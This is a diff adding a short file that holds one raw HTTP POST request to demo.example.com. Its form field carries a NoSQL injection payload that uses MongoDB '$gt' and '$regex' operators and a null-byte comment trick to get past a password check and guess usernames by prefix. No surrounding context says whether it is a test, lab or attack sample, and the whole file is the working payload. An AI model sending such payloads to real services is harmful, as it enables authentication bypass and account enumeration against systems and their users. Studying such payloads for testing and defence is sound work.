@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Connection: close
+
+id={"/*%00*/password":{"$gt":""},"user":{"$regex":"^a"}}
